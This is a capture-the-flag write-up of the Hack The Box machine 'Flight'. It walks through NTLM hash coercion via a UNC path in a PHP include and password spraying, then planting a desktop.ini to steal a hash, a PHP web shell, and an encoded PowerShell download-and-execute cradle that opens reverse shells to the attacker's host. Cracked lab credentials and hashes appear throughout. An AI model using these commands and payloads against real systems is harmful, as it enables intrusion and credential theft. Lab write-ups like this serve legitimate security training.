---
techniques:
  - "Coercion"
  - "Revshells"
difficulty: "Hard"
status: "Rooted"
os: "Windows"
season: "HTB"
name: "Flight"
title: "Flight"
notion_id: "3800f091-be70-80cb-89ad-ef5ea66375d8"
last_synced: "2026-07-08T01:01:33.127Z"
---

## Recon

<details>
<summary>Nmap</summary>

```bash
…/labs/unrested 10.10.17.85 ❯ sudo nmap -sC -sV -T4 $DC
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-15 17:18 +0100
Nmap scan report for 10.129.228.120
Host is up (0.084s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-15 23:18:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-15T23:18:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.51 seconds
```


</details>

<details>
<summary>Web / Service Enumeration</summary>

```bash
…/labs/manager 10.10.17.85 ❯ ffuf -u http://$DC/ -H "Host: FUZZ.flight.htb" -w ~/tools/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc 200 -fw 1546

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.228.120/
 :: Wordlist         : FUZZ: /home/kanyo/tools/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response words: 1546
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 154ms]
```


</details>


---


## Initial Access


nothing interesting was on the main domain, but we see sm interesting when we navigate to the `school` subdomain, we find an `index.php` page, with a `view=`, which could be vulnerable to an `LFI`


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/c1c8c7f9-3e87-498d-b2e8-ee7731be1e8c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TOGHPRSW%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T010132Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCCFLHl4nU%2BCvLTK9fxahP%2BdnAGlUaQI5JKc%2BqajgiYoAIhAI59lUmGKOBTZWtKy5qVFmDxSE4VW%2BBLNEAnf4S9Kdl5Kv8DCHcQABoMNjM3NDIzMTgzODA1Igz0jf6gLJbc9EKW1tsq3APtP6fyQMKHAz24eO5T%2F0kWVcwfYyvAvqAPMZ%2B97Pp8VPbgG9NpYEkNUlHkyYY3BKg%2BEAjD7UtQkvuij6jc4LABzxLPZ68mUce%2BYSvK0vPbg477x1v0ewsJz0CJu2u%2F1QQ0d9IqN1w6YzqdRXrDXcFlpkSnI71CThGL7DMVVI3mgwixgJOEo6xKturSh5Fhnwi9fNI3goMlBTDqspbaWw03LRxplsbjwV5uvoEdFc1H%2FvWR37Urai1J0WxOVshb1UcZO3EbvPGMID70tD4WLSE3YD0b0L3imuBqaTfe9BavhX7SZehGjqlHNAo2O%2F6pNctcwT8b3xgwehF2ODWi5P7CyK1l%2Bl%2F%2F%2BVNPQNtwmntXLGXGKQ%2FPjlx2r3FzFk8bpxCMHCb3YItYy7Dblqz%2F5mBotmSYnIwPLJg3BUpjB9Rv3%2FAYaRff%2FlzjIpBv2a%2BX9ZXs3vXiZqzGtgnPIdrUMW9OgdvPQlwYr5R039ctjEMtJ6rWoeXwqLNZy7yuORZigfTadxJ9Dzs4ZOPPtamHqx40vOWmx0gaKSkcmyW9%2Fat2n0mYJvF78DGkuh3Wgmswc6on8q7S%2BHl1p%2BgDZvkSXT6XTUpB38fEfSpLk77kDfyGDlRyjF1z0db%2BjcT8uTCa3rXSBjqkAXVOECRr7PbE9u3LupVEVvY%2FDJBp0MQUURgaPjr3zeuzkYzMU5UFYC5IoQ1cUTTkk0mwuvtrOXpqhSiPiJbBKEuIuzjEMg8TpUxsmXCRhU8yhE3LrEGDTjsUJYKhHTyZDZqWIa1dM1cr5htaMZgWP5Vw9kjcWruIcpPRbXBonOWMwC1vHe7Vu0oisjrsGPp6esCANjcKMHtdB5tlR5zHg2dsQw57&X-Amz-Signature=f00e798d0f299b3ec30bbc8c581162249c7034bce953d86cc89c6b116450504f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


i tried a few LFI primitives to read source code or Local files, but then remembered that file wrappers send UNC style-path to Windows API and force it to authenticate to external servers


more specifically, file-handling function on Windows (`file_get_contents()`, `fopen()`, `include()`, etc.), passing a UNC-style path like `//attacker_ip/share` causes the underlying Windows API to treat it as a network resource rather than a local file. Windows automatically attempts to authenticate to that "share" using the current process's credentials (here, the service account running the web server, `svc_apache`)


so we can specifiy `//IP/Share` and launch responder on our end, to retrieve the hash


```bash
GET /index.php?view=//10.10.17.85/share HTTP/1.1
Host: school.flight.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://school.flight.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:6ba2222f7b36a6f9:53CFB09050429729CE11022D457A7409:0101000000000000801421D1F7FCDC0131ED2CAF2F0402DB000000000200080058004C004A00460001001E00570049004E002D003000300050003500430035005100550032005A00590004003400570049004E002D003000300050003500430035005100550032005A0059002E0058004C004A0046002E004C004F00430041004C000300140058004C004A0046002E004C004F00430041004C000500140058004C004A0046002E004C004F00430041004C0007000800801421D1F7FCDC0106000400020000000800300030000000000000000000000000300000E3001140B12312638E7FD493281160E0EAB56E9A2D597601705040183106D8A40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00380035000000000000000000
```


then we crack it and get the password

> Username `svc_apache` & Password `S@Ss!K@*t13`

```bash
…/labs/manager 10.10.17.85 2s ❯ nxc smb $DC -u svc_apache -p $PASS --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions            Remark
SMB         10.129.228.120  445    G0               -----           -----------            ------
SMB         10.129.228.120  445    G0               ADMIN$                                 Remote Admin
SMB         10.129.228.120  445    G0               C$                                     Default share
SMB         10.129.228.120  445    G0               IPC$            READ                   Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ                   Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ                   
SMB         10.129.228.120  445    G0               SYSVOL          READ                   Logon server share 
SMB         10.129.228.120  445    G0               Users           READ                   
SMB         10.129.228.120  445    G0               Web             READ
```


we have a few interesting shares to check up on, meanwhile ill also get bloodhound data


```bash
…/labs/manager 10.10.17.85 ✗ smbclient //$DC/Users/ -U "svc_apache%$PASS"
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Sep 22 21:16:56 2022
  ..                                 DR        0  Thu Sep 22 21:16:56 2022
  .NET v4.5                           D        0  Thu Sep 22 20:28:03 2022
  .NET v4.5 Classic                   D        0  Thu Sep 22 20:28:02 2022
  Administrator                       D        0  Mon Oct 31 19:34:00 2022
  All Users                       DHSrn        0  Sat Sep 15 08:28:48 2018
  C.Bum                               D        0  Thu Sep 22 21:08:23 2022
  Default                           DHR        0  Tue Jul 20 20:20:24 2021
  Default User                    DHSrn        0  Sat Sep 15 08:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 08:16:48 2018
  Public                             DR        0  Tue Jul 20 20:23:25 2021
  svc_apache                          D        0  Fri Oct 21 19:50:21 2022
```


i got everything locally, no interesting edges on bloodhound, also did a quick bloodyAD check & Kerberoasting, just to make sure what im looking for is exactly in the shares.


```bash
…/labs/flight 10.10.17.85 ❯ GetUserSPNs.py flight.htb/svc_apache:$PASS -dc-ip $DC   
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

No entries found!

…/labs/flight 10.10.17.85 ❯ GetNPUsers.py flight.Htb/svc_apache:$PASS -dc-ip $DC -request -format hashcat
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```


```bash
/flight/Shares 10.10.17.85 ❯ bloodyAD -u svc_apache -p $PASS -d flight.htb --host $DC get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=flight,DC=htb
permission: WRITE

distinguishedName: CN=svc_apache,CN=Users,DC=flight,DC=htb
permission: WRITE

distinguishedName: DC=flight.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=flight,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.flight.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=flight,DC=htb
permission: CREATE_CHILD
```


the web share mostly contained the exposed web services, so its not worth looking into, the users share seems to be our main target


well, interestingly enough, nothing interesting was there, given we only had access to svc_apache’s stuff. no credentials no nothing 


i did try to leak other configuration files through the LFI, but that didn’t seem as intended, we’re running out of options here, so ill dump the users list and try password spraying


 user descriptions don’t hold anything meaningful, lets spray with svc_apache’s password


```bash
…/flight/Web 10.10.17.85 ✗ nxc smb $DC -u svc_apache -p 'S@Ss!K@*t13' --users
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.228.120  445    G0               Administrator                 2022-09-22 20:17:02 0       Built-in account for administering the computer/domain 
SMB         10.129.228.120  445    G0               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.228.120  445    G0               krbtgt                        2022-09-22 19:48:01 0       Key Distribution Center Service Account 
SMB         10.129.228.120  445    G0               S.Moon                        2022-09-22 20:08:22 0       Junion Web Developer 
SMB         10.129.228.120  445    G0               R.Cold                        2022-09-22 20:08:22 0       HR Assistant 
SMB         10.129.228.120  445    G0               G.Lors                        2022-09-22 20:08:22 0       Sales manager 
SMB         10.129.228.120  445    G0               L.Kein                        2022-09-22 20:08:22 0       Penetration tester 
SMB         10.129.228.120  445    G0               M.Gold                        2022-09-22 20:08:22 0       Sysadmin 
SMB         10.129.228.120  445    G0               C.Bum                         2022-09-22 20:08:22 1       Senior Web Developer 
SMB         10.129.228.120  445    G0               W.Walker                      2022-09-22 20:08:22 0       Payroll officer 
SMB         10.129.228.120  445    G0               I.Francis                     2022-09-22 20:08:22 0       Nobody knows why he's here 
SMB         10.129.228.120  445    G0               D.Truff                       2022-09-22 20:08:22 0       Project Manager 
SMB         10.129.228.120  445    G0               V.Stevens                     2022-09-22 20:08:22 0       Secretary 
SMB         10.129.228.120  445    G0               svc_apache                    2022-09-22 20:08:23 0       Service Apache web 
SMB         10.129.228.120  445    G0               O.Possum                      2022-09-22 20:08:23 0       Helpdesk
```


looks like we got a hit!! 


```bash
…/labs/flight 10.10.17.85 3s ❯ nxc smb $DC -u usernames.txt -p $PASS --continue-on-success
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```


new users unlocked

> Username `S.Moon` & Password `S@Ss!K@*t13`

hopefully she’ll give us more depth, lets enumerate the shares again


```bash
…/labs/flight 10.10.17.85 ❯ nxc smb $DC -u s.moon -p $PASS --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\s.moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions            Remark
SMB         10.129.228.120  445    G0               -----           -----------            ------
SMB         10.129.228.120  445    G0               ADMIN$                                 Remote Admin
SMB         10.129.228.120  445    G0               C$                                     Default share
SMB         10.129.228.120  445    G0               IPC$            READ                   Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ                   Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE             
SMB         10.129.228.120  445    G0               SYSVOL          READ                   Logon server share 
SMB         10.129.228.120  445    G0               Users           READ                   
SMB         10.129.228.120  445    G0               Web             READ
```


she has `READ,WRITE` over `Shared` , wait, shared was empty when we checked earlier, is there supposed to be a scheduled task running


ive also checked if there are any edges on bloodhound and if she has anything writable, nothing interesting popped up


```bash
…/labs/flight 10.10.17.85 ✗ smbclient //$DC/Shared/ -U "s.moon%$PASS" -m SMB3
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> put test.txt
NT_STATUS_ACCESS_DENIED opening remote file \test.txt
```


trying to write a file to the share, and i got access denied, after some playing around, it turned out that only .ini files can be written to the share


```bash
…/labs/flight 10.10.17.85 ✗ smbclient //$DC/Shared/ -U "s.moon%$PASS"
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> put test.ini
putting file test.ini as \test.ini (0.0 kB/s) (average 0.0 kB/s)
```


okey, lets see what we have, a share called `Shared` , and the `Write` access seems to be the only thing extra that we got from `svc_apache`, so it has to be the way forward, but we can’t just go around and enumerate scheduled tasks from where we stand, as we don’t have a shell yet, and theres not so much that the LFI can do.


one thing that stands out, is the name `Shared` , this must mean its accessible too multiple users, so i went and done some digging, and it turns out theres a tool for this, we could inject a malicious ini file, that would coerce whoever accesses the folder to authenticate to us, hence getting his NTLMv2 hash


[link_preview](https://github.com/Greenwolf/ntlm_theft.git)


```bash
ntlm_theft master 10.10.17.85 🐍 ✗ python3 ntlm_theft.py -g all -s 10.10.17.85 -f flight
/home/kanyo/work/htb/labs/flight/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: "\l" is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\l"? A raw string is also an option.
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: flight/flight.scf (BROWSE TO FOLDER)
Created: flight/flight-(url).url (BROWSE TO FOLDER)
Created: flight/flight-(icon).url (BROWSE TO FOLDER)
Created: flight/flight.lnk (BROWSE TO FOLDER)
Created: flight/flight.rtf (OPEN)
Created: flight/flight-(stylesheet).xml (OPEN)
Created: flight/flight-(fulldocx).xml (OPEN)
Created: flight/flight.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: flight/flight-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: flight/flight-(includepicture).docx (OPEN)
Created: flight/flight-(remotetemplate).docx (OPEN)
Created: flight/flight-(frameset).docx (OPEN)
Created: flight/flight-(externalcell).xlsx (OPEN)
Created: flight/flight.wax (OPEN)
Created: flight/flight.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: flight/flight.asx (OPEN)
Created: flight/flight.jnlp (OPEN)
Created: flight/flight.application (DOWNLOAD AND OPEN)
Created: flight/flight.pdf (OPEN AND ALLOW)
Created: flight/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: flight/flight.library-ms (BROWSE TO FOLDER)
Created: flight/Autorun.inf (BROWSE TO FOLDER)
Created: flight/desktop.ini (BROWSE TO FOLDER)
Created: flight/flight.theme (THEME TO INSTALL
Generation Complete.
```


we’ll use `flight/desktop.ini (BROWSE TO FOLDER)` because its an ini files, and assuming that user only browses to the shares folder


then we put it in the share, and wait for responder to catch us a hash


```bash
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:211a2f5ee714e8b6:4921BAFAAB5502E71BF78D4758ECECDF:0101000000000000807DD24F09FDDC01D1346A922B25AAAE000000000200080046004B003900530001001E00570049004E002D004B0056003700470031004C005000340053004B00320004003400570049004E002D004B0056003700470031004C005000340053004B0032002E0046004B00390053002E004C004F00430041004C000300140046004B00390053002E004C004F00430041004C000500140046004B00390053002E004C004F00430041004C0007000800807DD24F09FDDC0106000400020000000800300030000000000000000000000000300000E3001140B12312638E7FD493281160E0EAB56E9A2D597601705040183106D8A40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00380035000000000000000000
```


there we go, looks like we got cbum!!

> Username `c.bum` & Password `Tikkycoll_431012284`

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/e74e6d29-6b09-400c-b150-3ef587564a7c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TOGHPRSW%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T010132Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCCFLHl4nU%2BCvLTK9fxahP%2BdnAGlUaQI5JKc%2BqajgiYoAIhAI59lUmGKOBTZWtKy5qVFmDxSE4VW%2BBLNEAnf4S9Kdl5Kv8DCHcQABoMNjM3NDIzMTgzODA1Igz0jf6gLJbc9EKW1tsq3APtP6fyQMKHAz24eO5T%2F0kWVcwfYyvAvqAPMZ%2B97Pp8VPbgG9NpYEkNUlHkyYY3BKg%2BEAjD7UtQkvuij6jc4LABzxLPZ68mUce%2BYSvK0vPbg477x1v0ewsJz0CJu2u%2F1QQ0d9IqN1w6YzqdRXrDXcFlpkSnI71CThGL7DMVVI3mgwixgJOEo6xKturSh5Fhnwi9fNI3goMlBTDqspbaWw03LRxplsbjwV5uvoEdFc1H%2FvWR37Urai1J0WxOVshb1UcZO3EbvPGMID70tD4WLSE3YD0b0L3imuBqaTfe9BavhX7SZehGjqlHNAo2O%2F6pNctcwT8b3xgwehF2ODWi5P7CyK1l%2Bl%2F%2F%2BVNPQNtwmntXLGXGKQ%2FPjlx2r3FzFk8bpxCMHCb3YItYy7Dblqz%2F5mBotmSYnIwPLJg3BUpjB9Rv3%2FAYaRff%2FlzjIpBv2a%2BX9ZXs3vXiZqzGtgnPIdrUMW9OgdvPQlwYr5R039ctjEMtJ6rWoeXwqLNZy7yuORZigfTadxJ9Dzs4ZOPPtamHqx40vOWmx0gaKSkcmyW9%2Fat2n0mYJvF78DGkuh3Wgmswc6on8q7S%2BHl1p%2BgDZvkSXT6XTUpB38fEfSpLk77kDfyGDlRyjF1z0db%2BjcT8uTCa3rXSBjqkAXVOECRr7PbE9u3LupVEVvY%2FDJBp0MQUURgaPjr3zeuzkYzMU5UFYC5IoQ1cUTTkk0mwuvtrOXpqhSiPiJbBKEuIuzjEMg8TpUxsmXCRhU8yhE3LrEGDTjsUJYKhHTyZDZqWIa1dM1cr5htaMZgWP5Vw9kjcWruIcpPRbXBonOWMwC1vHe7Vu0oisjrsGPp6esCANjcKMHtdB5tlR5zHg2dsQw57&X-Amz-Signature=464e5f9d4715446ba90d6dc141e08f3b37a4856e7b78b1d66f4be74bbf6f287d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


we still don’t have winrm access just yet, looking at bloodhound, c.bum is part of a `WebDevs` group, first thing that comes to mind is that he gives us access to an extra share or so, but hey! C.bum has a folder in the `Users` Share, we can access that!, maybe we have got user after all


and we do!!!


```bash
smb: \C.Bum\Desktop\> ls
  .                                  DR        0  Thu Sep 22 21:17:02 2022
  ..                                 DR        0  Thu Sep 22 21:17:02 2022
  user.txt                           AR       34  Tue Jun 16 00:14:45 2026
```


## Privilege Escalation


lets see now what can c.bum grant us


```bash
tlm_theft/flight master ? 10.10.17.85 ✗ bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=flight,DC=htb
permission: WRITE

distinguishedName: CN=C.Bum,CN=Users,DC=flight,DC=htb
permission: WRITE

distinguishedName: DC=flight.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=flight,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.flight.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=flight,DC=htb
permission: CREATE_CHILD
```


nothing on bloodhound, nothing on bloodyAD, ill check what the `WebDevs` group has access to aswell, most likely access to a share.


```bash
…/flight/CBum_files 10.10.17.85 ✗ nxc smb $DC -u c.bum -p 'Tikkycoll_431012284' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions            Remark
SMB         10.129.228.120  445    G0               -----           -----------            ------
SMB         10.129.228.120  445    G0               ADMIN$                                 Remote Admin
SMB         10.129.228.120  445    G0               C$                                     Default share
SMB         10.129.228.120  445    G0               IPC$            READ                   Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ                   Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE             
SMB         10.129.228.120  445    G0               SYSVOL          READ                   Logon server share 
SMB         10.129.228.120  445    G0               Users           READ                   
SMB         10.129.228.120  445    G0               Web             READ,WRITE
```


and yes, that was right!!, cbum has write access over the web share, which hosts our web services, we can most definitely upload a php/aspx shell there


[link_preview](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)


ill edit nishang’s powershell revshell to my needs, and rename it as shell.ps1


as the site executes php, we’ll need to upload a simple php revshell first


```bash
echo '<?php system($_GET["c"]); ?>' > cmd.php
```


we’ll put this in the webroot through the share access


```bash
…/manager/backup 10.10.17.85 ❯ python3 -c "
import base64
cmd = \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.17.85:9000/shell.ps1')\"
print(base64.b64encode(cmd.encode('utf-16le')).decode())
"

curl "http://school.flight.htb/cmd.php?c=powershell+-enc+ENCODEDB64PAYLOAD
```


then we go & check our listener


```bash
…/tools/webshells🔒 10.10.17.85 ❯ rlwrap nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.228.120 63069
whoami
flight\svc_apache
PS C:\xampp\htdocs\school.flight.htb>
```


i ran winpreas as svc_apache, but not with much hope, its a service account, obviously there wouldn’t be anything interesting here, so i quickly shifted to Cbum with runascs


```bash
PS C:\Windows\Temp> .\runascs.exe c.bum "Tikkycoll_431012284" "powershell" --domain flight.htb -r 10.10.17.85:8888
[*] Warning: The logon for user 'c.bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-588b0$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1628 created in background.
```


```bash
…/labs/flight 10.10.17.85 ❯ rlwrap nc -lvnp 8888
Listening on 0.0.0.0 8888
Connection received on 10.129.228.120 61858F
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
flight\c.bum
```


and now we have shell as Cbum


lets take a sneekpeak at winpeas, Hello there


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/0791fa20-291d-448e-a122-624d40ace675/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TOGHPRSW%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T010132Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCCFLHl4nU%2BCvLTK9fxahP%2BdnAGlUaQI5JKc%2BqajgiYoAIhAI59lUmGKOBTZWtKy5qVFmDxSE4VW%2BBLNEAnf4S9Kdl5Kv8DCHcQABoMNjM3NDIzMTgzODA1Igz0jf6gLJbc9EKW1tsq3APtP6fyQMKHAz24eO5T%2F0kWVcwfYyvAvqAPMZ%2B97Pp8VPbgG9NpYEkNUlHkyYY3BKg%2BEAjD7UtQkvuij6jc4LABzxLPZ68mUce%2BYSvK0vPbg477x1v0ewsJz0CJu2u%2F1QQ0d9IqN1w6YzqdRXrDXcFlpkSnI71CThGL7DMVVI3mgwixgJOEo6xKturSh5Fhnwi9fNI3goMlBTDqspbaWw03LRxplsbjwV5uvoEdFc1H%2FvWR37Urai1J0WxOVshb1UcZO3EbvPGMID70tD4WLSE3YD0b0L3imuBqaTfe9BavhX7SZehGjqlHNAo2O%2F6pNctcwT8b3xgwehF2ODWi5P7CyK1l%2Bl%2F%2F%2BVNPQNtwmntXLGXGKQ%2FPjlx2r3FzFk8bpxCMHCb3YItYy7Dblqz%2F5mBotmSYnIwPLJg3BUpjB9Rv3%2FAYaRff%2FlzjIpBv2a%2BX9ZXs3vXiZqzGtgnPIdrUMW9OgdvPQlwYr5R039ctjEMtJ6rWoeXwqLNZy7yuORZigfTadxJ9Dzs4ZOPPtamHqx40vOWmx0gaKSkcmyW9%2Fat2n0mYJvF78DGkuh3Wgmswc6on8q7S%2BHl1p%2BgDZvkSXT6XTUpB38fEfSpLk77kDfyGDlRyjF1z0db%2BjcT8uTCa3rXSBjqkAXVOECRr7PbE9u3LupVEVvY%2FDJBp0MQUURgaPjr3zeuzkYzMU5UFYC5IoQ1cUTTkk0mwuvtrOXpqhSiPiJbBKEuIuzjEMg8TpUxsmXCRhU8yhE3LrEGDTjsUJYKhHTyZDZqWIa1dM1cr5htaMZgWP5Vw9kjcWruIcpPRbXBonOWMwC1vHe7Vu0oisjrsGPp6esCANjcKMHtdB5tlR5zHg2dsQw57&X-Amz-Signature=f2d79961baae9c90002e24622d492135e521